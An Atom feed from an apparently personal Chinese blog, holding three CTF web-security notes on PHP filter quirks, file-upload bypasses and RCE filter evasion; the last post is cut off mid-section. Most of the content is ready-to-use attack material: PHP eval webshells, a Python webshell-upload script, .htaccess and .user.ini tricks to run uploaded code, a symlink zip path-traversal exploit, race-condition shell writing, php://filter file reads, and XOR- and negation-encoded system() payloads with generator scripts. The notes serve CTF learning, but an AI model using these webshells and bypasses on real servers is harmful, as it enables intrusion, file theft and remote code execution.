<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>hatchet的个人博客</title>
  
  
  <link href="https://blog.hatchet.top/atom.xml" rel="self"/>
  
  <link href="https://blog.hatchet.top/"/>
  <updated>2024-09-25T10:25:31.000Z</updated>
  <id>https://blog.hatchet.top/</id>
  
  <author>
    <name>hatchet</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP特性</title>
    <link href="https://blog.hatchet.top/posts/44659fec.html"/>
    <id>https://blog.hatchet.top/posts/44659fec.html</id>
    <published>2024-09-25T07:33:05.000Z</published>
    <updated>2024-09-25T10:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="REQUEST-循环查找参数"><a href="#REQUEST-循环查找参数" class="headerlink" title="$_REQUEST 循环查找参数"></a>$_REQUEST 循环查找参数</h1><pre><code>if($_REQUEST)&#123;    foreach ($_REQUEST as $key =&gt; $value) &#123;        if(preg_match(&#39;/[a-zA-Z]/i&#39;, $value))   die(&#39;waf&#39;);    &#125;&#125;</code></pre><p>$_REQUEST 优先识别 POST 传递的参数，在传入$_GET 的参数时也传一个同名的$_POST 参数值，可以覆盖对$_REQUEST 的过滤。</p><h1 id="SERVER-‘QUERY-STRING’-检查"><a href="#SERVER-‘QUERY-STRING’-检查" class="headerlink" title="$_SERVER[‘QUERY_STRING’]检查"></a>$_SERVER[‘QUERY_STRING’]检查</h1><pre><code>if($_SERVER)&#123;    if(preg_match(&#39;/yulige|flag|nctf/i&#39;, $_SERVER[&#39;QUERY_STRING&#39;]))  die(&#39;w2&#39;);&#125;</code></pre><p>$_SERVER 不会对参数 url 编码，可以对过滤的字符进行 URL 编码。一个寻找可被 url 编码字符的脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="number">100</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>)&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp; <span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>)&lt;=<span class="string">&#x27;z&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; &#x27;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="特殊名称参数-改为"><a href="#特殊名称参数-改为" class="headerlink" title="特殊名称参数: _改为["></a>特殊名称参数: _改为[</h1><p><code>$_GET[&#39;ez_ser.from_you&#39;]</code>这种同时存在_和.的参数，传参时要把参数第一个 _ 换为 [ ,传入 <code>ez[ser.from_you</code> 即可正常传入，原理待补充。</p><h1 id="哈希函数相关"><a href="#哈希函数相关" class="headerlink" title="哈希函数相关"></a>哈希函数相关</h1><p><a href="https://blog.hatchet.top/posts/66a71aff">常见的哈希函数绕过</a></p><h1 id="file-get-contents-GET-‘flag’-绕过"><a href="#file-get-contents-GET-‘flag’-绕过" class="headerlink" title="file_get_contents($_GET[‘flag’])绕过"></a>file_get_contents($_GET[‘flag’])绕过</h1><h2 id="要求-file-get-contents-GET-‘flag’-’flag’为真"><a href="#要求-file-get-contents-GET-‘flag’-’flag’为真" class="headerlink" title="要求 file_get_contents($_GET[‘flag’])&#x3D;&#x3D;’flag’为真"></a>要求 file_get_contents($_GET[‘flag’])&#x3D;&#x3D;’flag’为真</h2><h2 id="data-text"><a href="#data-text" class="headerlink" title="data:&#x2F;&#x2F;text"></a>data:&#x2F;&#x2F;text</h2><ol><li>flag&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,flag</li><li>flag&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZmxhZw&#x3D;&#x3D;</li></ol><h2 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><pre><code>GET 传参:flag=php://inputPOST 传参:flag</code></pre><h2 id="限制-GET-‘flag’-以-http-开头且-strpos-file-get-contents-GET-‘flag’-’content’-true"><a href="#限制-GET-‘flag’-以-http-开头且-strpos-file-get-contents-GET-‘flag’-’content’-true" class="headerlink" title="限制$_GET[‘flag’]以 http 开头且 strpos(file_get_contents($_GET[‘flag’]),’content’)&#x3D;&#x3D;&#x3D;true"></a>限制$_GET[‘flag’]以 http 开头且 strpos(file_get_contents($_GET[‘flag’]),’content’)&#x3D;&#x3D;&#x3D;true</h2><p>flag&#x3D;<a href="http://example.com@127.0.0.1/">http://example.com@127.0.0.1</a><br>或者搭建 vps 将@后替换为自己的域名</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="include-require-等-php-filter"><a href="#include-require-等-php-filter" class="headerlink" title="include,require 等 -&gt; php:&#x2F;&#x2F;filter"></a>include,require 等 -&gt; php:&#x2F;&#x2F;filter</h2><h3 id="常规读取"><a href="#常规读取" class="headerlink" title="常规读取"></a>常规读取</h3><pre><code>?file=php://filter/convert.base64-encode/resource=传马?file=data://text/plain,&lt;?php phpinfo();?&gt;</code></pre><h3 id="过滤了-base64"><a href="#过滤了-base64" class="headerlink" title="过滤了 base64"></a>过滤了 base64</h3><pre><code>?file=php://filter//convert.iconv.UCS-4*.UCS-4*/resource=?file=php://filter/read=convert.iconv.utf-8.utf-16/resource=?file=php://filter/read=convert.quoted-printable-encode/resource=</code></pre><p>可用的 filter 编码名单</p><pre><code>UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*</code></pre><h2 id="绕过-require-once-命令"><a href="#绕过-require-once-命令" class="headerlink" title="绕过 require_once 命令"></a>绕过 require_once 命令</h2><p>轮流循环绕过</p><pre><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php?file=php://filter/convert.base64-encode/resource=/nice/../../proc/self/cwd/flag.php</code></pre><h2 id="file-get-contents-file-和-local-file"><a href="#file-get-contents-file-和-local-file" class="headerlink" title="file_get_contents -&gt; file:&#x2F;&#x2F;和 local_file:&#x2F;&#x2F;"></a>file_get_contents -&gt; file:&#x2F;&#x2F;和 local_file:&#x2F;&#x2F;</h2><p>读取常见目录</p><h2 id="system-命令读文件过滤了-和字母"><a href="#system-命令读文件过滤了-和字母" class="headerlink" title="system 命令读文件过滤了&#x2F;和字母"></a>system 命令读文件过滤了&#x2F;和字母</h2><pre><code>$&#123;PWD%%[a-z]*&#125;可以在 url 上构造 /例如读到 flag 位置在 /_flag直接读取 $&#123;PWD%%[a-z]*&#125;_*</code></pre><h1 id="preg-match-返回-false-，利用-pcre"><a href="#preg-match-返回-false-，利用-pcre" class="headerlink" title="preg_match 返回 false ，利用 pcre"></a>preg_match 返回 false ，利用 pcre</h1><p>必须用 POST 传参，GET 有字符上限。<br>pcre 原理为 preg_match 递归查找会限制字符长度，默认值为 1000000，如果超出会返回 bool(false)。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://example.com/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;t&quot;</span>: <span class="string">&quot;-&quot;</span> * <span class="number">1000001</span> + <span class="string">&quot;aaa&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>出不来可以适当增加字符长度。(有次把次数设成 1011451 就能过了，抽象)</p><h1 id="PHP-原生类"><a href="#PHP-原生类" class="headerlink" title="PHP 原生类"></a>PHP 原生类</h1><pre><code>DirectoryIterator,FilesystemIterator,GlobIterator -&gt;可遍历目录类SplFileObject-&gt;读取文件类</code></pre><h2 id="使用范例-可配合-php-伪协议"><a href="#使用范例-可配合-php-伪协议" class="headerlink" title="使用范例(可配合 php 伪协议)"></a>使用范例(可配合 php 伪协议)</h2><h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><pre><code>$text=new $a($b);foreach ($text as $tmp)&#123;    echo $tmp;&#125;a=DirectoryIterator&amp;b=/a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=index.php</code></pre><h3 id="简略写法"><a href="#简略写法" class="headerlink" title="简略写法"></a>简略写法</h3><pre><code>echo (new $a($b))-&gt;$c();//c可以省略a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=index.php&amp;c=fgetsa=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=index.php&amp;c=__toString</code></pre><h1 id="PHP-类名大小写"><a href="#PHP-类名大小写" class="headerlink" title="PHP 类名大小写"></a>PHP 类名大小写</h1><p>php 对于类名大小写不敏感，A 和 a 都会认为是同一个类。</p><h1 id="…（更新中）"><a href="#…（更新中）" class="headerlink" title="…（更新中）"></a>…（更新中）</h1>]]></content>
    
    
    <summary type="html">最特性的一集</summary>
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
    <category term="PHP" scheme="https://blog.hatchet.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>upload常见考题类型</title>
    <link href="https://blog.hatchet.top/posts/6906b803.html"/>
    <id>https://blog.hatchet.top/posts/6906b803.html</id>
    <published>2024-09-21T04:37:18.000Z</published>
    <updated>2024-09-25T09:36:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h1><p>屏蔽 js 脚本，或者用 python 直接上传<br>python 上传模版</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:100/upload.php&quot;</span></span><br><span class="line">file_content = <span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span></span><br><span class="line">filename = <span class="string">&quot;a.php&quot;</span></span><br><span class="line">mime_type = <span class="string">&quot;image/png&quot;</span></span><br><span class="line">file = &#123;<span class="string">&quot;file&quot;</span>: (filename, file_content,mime_type)&#125;</span><br><span class="line">response = requests.post(url, files=file)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者按它的格式上传，在抓包时修改文件后缀</p><h1 id="检测-MIME-TYPE"><a href="#检测-MIME-TYPE" class="headerlink" title="检测 MIME_TYPE"></a>检测 MIME_TYPE</h1><p>修改 Content-Type<br>jpg&#x2F;png&#x2F;gif: image&#x2F;jpeg(png&#x2F;gif)<br>zip: application&#x2F;zip<br>在文件开头加 GIF89a 可绕过 getimagesize()</p><h1 id="php-一句话"><a href="#php-一句话" class="headerlink" title="php 一句话"></a>php 一句话</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">一般一句话</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">过滤php</span><br><span class="line">  <span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">过滤<span class="meta">&lt;?</span></span><br><span class="line">  &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br><span class="line">php开启短标签时</span><br><span class="line">  <span class="meta">&lt;?</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">  &lt;% <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);%&gt;</span><br><span class="line">过滤[]</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOw==&quot;</span>));<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">写马：</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;&lt;?=eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;z23.php&#x27;</span>,<span class="string">&#x27;a&#x27;</span>),<span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>);</span><br><span class="line">  <span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">最短一句话</span><br><span class="line">  <span class="meta">&lt;?=</span>`nl <span class="comment">/*`;</span></span><br></pre></td></tr></table></figure><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><h2 id="php-后缀绕过"><a href="#php-后缀绕过" class="headerlink" title="php 后缀绕过"></a>php 后缀绕过</h2><p>pht,phpt,phps,phtml,php1,php2,php3,php4,php5,php7 都能解释为 php</p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>两种方法</p><ol><li><p>替换后缀</p><pre><code>AddType application/x-httpd-php .jpg</code></pre><p>将 jpg 文件当作 php 文件解析</p><pre><code>SetHandler application/x-httpd-php</code></pre><p>将当前所有文件当作 php 文件解析</p><p>先上传.htaccess 提交<br> 再上传 shell.jpg,直接访问 shell.jpg，服务器会识别为 php 文件</p></li><li><p>直接在开头&#x2F;结尾写 php 文件,在适用于当前页面存在 php 文件<br>auto_prepend_file&#x3D;a.jpg &#x2F;&#x2F;在页面顶部加载文件<br>auto_append_file&#x3D;a.jpg &#x2F;&#x2F;在页面底部加载文件<br>url 传参</p><pre><code>?content=php_value+auto_prepend_fi\%0Ale+.htaccess%0A%23&lt;?=(`ls+/`);?&gt;%0A%23\</code></pre><p>如果被过滤在过滤词中间加%0A 使用换行绕过<br>上传文件直接写</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le .htaccess</span><br><span class="line">#&lt;?php phpinfo();?&gt;</span><br><span class="line">#\</span><br></pre></td></tr></table></figure><pre><code>#是单行注释符号#\用于注释后面添加的字符#被过滤可以使用\x00GIF89a#define width 1337#define height 1337这三项可对getimagesize和exif_imagetype进行绕过WEBP前缀:\x00\x00\x85\x85</code></pre><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><ul><li>如果 index.php 不在当前目录下,.user.ini 不生效</li></ul><p>直接在开头&#x2F;结尾写 php 文件</p><pre><code>  auto_prepend_file=a.jpg //在页面顶部加载文件  auto_append_file=a.jpg //在页面底部加载文件  在a.jpg末尾写一句话就行  访问url/upload</code></pre><h2 id="文件名绕过"><a href="#文件名绕过" class="headerlink" title="文件名绕过"></a>文件名绕过</h2><h3 id="00-绕过"><a href="#00-绕过" class="headerlink" title="%00 绕过"></a>%00 绕过</h3><p>构造类似 a.php%00.jpg,将%00 url 解码<br>PHP 版本小于 5.3.4 时，利用%00（结束符）来截断文件后缀名，%00 后的字符会被自动删除</p><h3 id="在后面加-或"><a href="#在后面加-或" class="headerlink" title="在后面加.或&#x2F;."></a>在后面加.或&#x2F;.</h3><p>php.<br>有些服务器会直接忽略后面的点，导致绕过黑名单</p><h2 id="使用-zip-文件特性"><a href="#使用-zip-文件特性" class="headerlink" title="使用 zip 文件特性"></a>使用 zip 文件特性</h2><p>将 shell.php 压缩,修改后缀为 1.jpg,上传<br>如果存在读取参数?file&#x3D;，可以使用 phar 读取<br>phar:&#x2F;&#x2F;.&#x2F;upload&#x2F;1.jpg&#x2F;shell.php<br>过滤不严可以用 file:&#x2F;&#x2F;和 php:&#x2F;&#x2F;filter 伪协议直接尝试读取 flag</p><h3 id="CISCN2023-unzip"><a href="#CISCN2023-unzip" class="headerlink" title="CISCN2023-unzip"></a>CISCN2023-unzip</h3><p>利用软连接，进行目录穿越，将文件上传到任意目录</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var</span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">test</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">test</span></span><br><span class="line"><span class="built_in">ln</span> -s /var/www/html <span class="built_in">link</span></span><br><span class="line">zip --symlinks exp1.zip <span class="built_in">link</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="built_in">link</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">link</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">link</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;</span> &gt; shell.php</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">zip -r exp2.zip <span class="built_in">link</span>/</span><br></pre></td></tr></table></figure><p>上传 exp1.zip,exp2.zip,服务器解压时把 shell.php 解压到&#x2F;var&#x2F;www&#x2F;html。实现 getshell。</p><h2 id="文件内容无字母"><a href="#文件内容无字母" class="headerlink" title="文件内容无字母"></a>文件内容无字母</h2><p>参考我的 RCE <a href="https://blog.hatchet.top/posts/26728343">各种 RCE 绕过</a><br>把开头的?&gt;去掉就可以用于文件上传,不要 url 编码</p><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>有些上传题允许上传 php 脚本，但会很快删除，我们只用构造一个生成 php 马的 php 文件不停上传这个 php 文件并访问，只要成功执行就能传马。</p><p>a.php</p><pre><code>&lt;?php fputs(fopen(&quot;shell.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#39;); ?&gt;</code></pre><p>用 burp intruder，payload 选 null payload 无限，一个上传 a.php,一个读取 a.php。就能传上 shell.php</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前端检测&quot;&gt;&lt;a href=&quot;#前端检测&quot; class=&quot;headerlink&quot; title=&quot;前端检测&quot;&gt;&lt;/a&gt;前端检测&lt;/h1&gt;&lt;p&gt;屏蔽 js 脚本，或者用 python 直接上传&lt;br&gt;python 上传模版&lt;/p&gt;
&lt;figure class=&quot;hig</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/tags/CTF/"/>
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>各种RCE绕过</title>
    <link href="https://blog.hatchet.top/posts/26728343.html"/>
    <id>https://blog.hatchet.top/posts/26728343.html</id>
    <published>2024-09-20T12:54:21.000Z</published>
    <updated>2024-09-26T11:20:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一些常见-RCE-形式"><a href="#一些常见-RCE-形式" class="headerlink" title="一些常见 RCE 形式"></a>一些常见 RCE 形式</h1><pre><code>eval($_POST[1]);`$_GET[1]`;?&gt;&lt;?=`&#123;$&#123;_GET&#125;[1]&#125;`?&gt;</code></pre><h1 id="eval-assert-的-RCE"><a href="#eval-assert-的-RCE" class="headerlink" title="eval(),assert()的 RCE"></a>eval(),assert()的 RCE</h1><p>核心是写个一句话马让蚁剑去连</p><pre><code>?cmd=file_put_contents(&quot;shell.php&quot;,&quot;&lt;?=eval(\$_POST[&#39;cmd&#39;]);?&gt;&quot;);?cmd=fputs(fopen(&#39;dotast.php&#39;,&#39;w&#39;),base64_decode(\&quot;PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOw==\&quot;));?cmd=fwrite(fopen(&#39;phpinfo.php&#39;,&#39;a&#39;),&#39;&lt;?php%20phpinfo();?&gt;&#39;);?cmd=echo%20&#39;&lt;?php @eval($_POST[&quot;123&quot;]);?&gt;&#39;%20&gt;%201.php?cmd=?&gt;&lt;?=`ls`;</code></pre><p>写 assert 时候蚁剑编码器选 base64</p><h1 id="无字母-RCE"><a href="#无字母-RCE" class="headerlink" title="无字母 RCE"></a>无字母 RCE</h1><ul><li>因为$,+等会被 url 混淆，务必使用 url 编码特殊字符！！！</li></ul><h2 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h2><pre><code>(&quot;%0f%08%0f%09%0e%06%0f&quot;^&quot;%7f%60%7f%60%60%60%60&quot;)(); //phpinfo();</code></pre><ul><li><p>assert($_POST[_]);&#x2F;&#x2F;PHP version&lt;7.1</p><pre><code>$_=&quot;!((%)(&quot;^&quot;@[[@[\\&quot;;$__=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$___=$$__;$_($___[_]);</code></pre></li><li><p>system($_POST[_]);</p><pre><code>  $_=&quot;(\&quot;((%-&quot;^&quot;[[[\\@@&quot;;$__=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$___=$$__;$_($___[_]);</code></pre></li></ul><p>构造异或脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$result1</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$result2</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h2><p>PHP7</p><pre><code>(~%8F%97%8F%96%91%99%90)(); //phpinfo(); 查看disable_functions(~%8C%86%8C%8B%9A%92)(~%93%8C);//system(&quot;ls&quot;);(~%97%96%98%97%93%96%98%97%8B%A0%99%96%93%9A)(~%D0%99%93%9E%98);//highlight_file(&quot;/flag&quot;);(~%9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C)(~%8C%86%8C%8B%9A%92,~%88%97%90%9E%92%96); //call_user_func(system,whoami);</code></pre><p>构造取反脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload1</span>=<span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;)();&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload2</span>=<span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">    <span class="variable">$payload3</span>=<span class="string">&#x27;(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>).<span class="string">&#x27;,~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload1</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload2</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$payload3</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PHP5</p><ul><li><p>assert($_POST[_]);&#x2F;&#x2F;PHP version&lt;7.1</p><pre><code>$_=~%22%9e%8c%8c%9a%8d%8b%22;$__=~%22%a0%af%b0%ac%ab%22;$___=$$__;$_($___[_]);</code></pre></li><li><p>system($_POST[_]);</p><pre><code>$_=~&quot;%8C%86%8C%8B%9A%92&quot;;$__=~&quot;%a0%af%b0%ac%ab&quot;;$___=$$__;$_($___[_]);</code></pre></li></ul><h2 id="中文绕过-全部字符-url-编码"><a href="#中文绕过-全部字符-url-编码" class="headerlink" title="中文绕过(全部字符 url 编码))"></a>中文绕过(全部字符 url 编码))</h2><ul><li><p>assert($_POST[_]);&#x2F;&#x2F;PHP 